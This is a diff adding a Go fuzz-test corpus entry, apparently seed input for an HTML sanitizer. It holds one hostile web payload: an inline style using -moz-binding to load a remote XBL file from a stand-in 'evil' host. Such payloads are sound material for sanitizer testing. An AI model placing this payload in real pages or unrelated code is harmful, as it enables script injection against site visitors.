@@ -1,0 +1,2 @@
+go test fuzz v1
+[]byte("<p style=\"color:red;-moz-binding:url(http://evil/x.xml)\">x</p>")
